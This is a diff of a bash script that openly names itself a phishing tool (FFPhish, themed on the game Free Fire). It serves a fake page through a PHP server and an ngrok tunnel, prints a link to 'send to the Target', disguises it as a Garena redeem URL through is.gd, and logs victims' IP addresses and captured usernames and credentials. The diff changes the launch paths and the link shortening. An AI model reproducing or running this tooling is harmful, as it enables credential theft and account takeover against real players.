@@ -7,7 +7,7 @@
 
 trap 'printf "\n";stop1;exit 1' 2
 
-server=$"FF"
+#server = "FF"
 
 #Check if all required dependencies are installed or not
 
@@ -21,7 +21,7 @@ command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not inst
 menu() {
 
 
-printf "\e[1;91m  Instructions:  \e[0m \n"
+printf "\e[1;91m  Instructions:  \n[1] You must have install php, curl and ngrok or serveo.net \n[2] If not then this script can not generate the links. \n[3] Ngrok or Serveo must be placed in the same folder in which freeire.sh is exists.\n\e[0m \n"
 read -p $'\e[1;93m[\e[1;92m*\e[1;93m]\e[1;92m Start the server (Y/n): \e[0m' option
 
 
@@ -63,12 +63,12 @@ exit 1
 
 banner() {
 
-printf "\e[1;92m ███████╗███████╗   ██████╗ ██╗███████╗██╗  ██╗ \e[0m\n"
-printf "\e[1;92m ██╔════╝██╔════╝   ██╔══██╗██║██╔════╝██║  ██║ \e[0m\n"
+printf "\e[1;92m ███████╗███████╗    ██████╗ ██╗███████╗██╗  ██╗ \e[0m\n"
+printf "\e[1;92m ██╔════╝██╔════╝    ██╔══██╗██║██╔════╝██║  ██║ \e[0m\n"
 printf "\e[1;92m █████╗  █████╗      ██████╔╝██║███████╗███████║ \e[0m\n"
 printf "\e[1;92m ██╔══╝  ██╔══╝      ██╔═══╝ ██║╚════██║██╔══██║ \e[0m\n"
-printf "\e[1;92m ██║     ██║          ██║      ██║███████║██║  ██║ \e[0m\n"
-printf "\e[1;92m ╚═╝     ╚═╝         ╚═╝       ╚═╝╚══════╝╚═╝  ╚═╝ \e[0m\n"
+printf "\e[1;92m ██║     ██║         ██║     ██║███████║██║  ██║ \e[0m\n"
+printf "\e[1;92m ╚═╝     ╚═╝         ╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝ \e[0m\n"
 printf "\n"
 printf "\e[1;93m       .:.:.\e[0m\e[1;77m Phishing Tool coded by: @Uni-Creator \e[0m\e[1;93m.:.:.\e[0m\n"
 printf "\n"
@@ -110,10 +110,10 @@ done
 catch_ip() {
 touch $server/saved.usernames.txt
 ip=$(grep -a 'IP:' $server/ip.txt | cut -d " " -f2 | tr -d '\r')
-IFS=$'\n'
-ua=$(grep 'User-Agent:' $server/ip.txt | cut -d '"' -f2)
+#IFS=$'\n'
+#ua=$(grep 'User-Agent:' $server/ip.txt | cut -d '"' -f2)
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Victim IP:\e[0m\e[1;77m %s\e[0m\n" $ip
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
+#printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
 cat $server/ip.txt >> $server/saved.ip.txt
 
@@ -248,7 +248,7 @@ rm -rf $server/usernames.txt
 
 fi
 
-
+cd ..
 if [[ -e ngrok ]]; then
 echo ""
 else
@@ -270,7 +270,6 @@ exit 1
 fi
 
 
-
 else
 wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
 if [[ -e ngrok-stable-linux-386.zip ]]; then
@@ -283,6 +282,7 @@ exit 1
 fi
 fi
 fi
+#cd FFPhish
 
 default_port="3333" #$(seq 1111 4444 | sort -R | head -n1)
 printf '\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_port
@@ -290,37 +290,23 @@ read port
 port="${port:-${default_port}}"
 
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
-cd $server && php -S 127.0.0.1:$port index.php> /dev/null 2>&1 & 
+cd FFPhish/$server && php -S 127.0.0.1:$port index.php> /dev/null 2>&1 & 
 sleep 2
 
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
-./ngrok http $port > /dev/null 2>&1 &
+cd .. && ./ngrok http $port > /dev/null 2>&1  &
 sleep 5
-
-#read -p '\e[1;92m[\e[0m*\e[1;92m] How many times do you want to use the tiny url link:\e[0m\e[1;77m' times
+cd FFPhish
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Target: %s\e[0m\e[1;77m %s\e[0m\n" $link
 
-
-#send_ip=$(curl -s "http://tny.im/yourls-api.php?action=shorturl&format=simple&url=$link/Free Fire.html&keyword=ff-redeems-garena" | head -n1)
-
-#send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$link/Free Fire.html | head -n1)
-
-send_ip=$(curl -s -N 'http://is.gd/create.php?format=simple&url=$link&shorturl=ff_garena_redeems' | grep -o "https://is.gd/ff_garena_redeems")
-
-#send_ip=$(curl -s http://is.gd/create.php?url=`perl -MURI::Escape -e "print uri_escape('$link/Free Fire.html');"` | head -n1)
+send_ip=$(curl -s -N 'http://is.gd/create.php?format=simple&url=$link' | grep -o "https://is.gd//[\w-\.]*")
 
 #send_ip=$'https://is.gd/ff_garena_redeems'
 
 printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using shortenurl (is.gd):\e[0m\e[1;70m %s \n' $send_ip
 printf "\n"
-
-#printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Shorten url copied to clipboard! This link can only be used %s times\e[0m\n' $times
-
-#cat $send_ip > /dev/clip 2>&1
-#pbcopy $link > /dev/clip 2>&1
-termux-clipboard-set $send_ip
 
 checkfound
 }
@@ -362,7 +348,7 @@ printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
 catch_ip
 rm -rf $server/ip.txt
 fi
-sleep 0.5
+#sleep 0.5
 if [[ -e "$server/usernames.txt" ]]; then
 printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
 catch_cred
